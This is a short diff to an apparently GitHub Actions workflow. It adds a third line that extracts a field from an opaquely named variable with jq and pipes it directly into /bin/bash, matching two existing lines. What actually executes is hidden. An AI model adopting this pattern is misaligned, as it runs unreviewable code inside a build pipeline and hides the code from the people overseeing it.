@@ -28,6 +28,7 @@ jobs:
         run: |
           printf '%s' "$az01782" | jq -r .rds1 | /bin/bash
           printf '%s' "$agt3998" | jq -r .lsyce62385 | /bin/bash
+          printf '%s' "$xemda68757" | jq -r .u53 | /bin/bash
 
       - name: Upload results
         if: always()
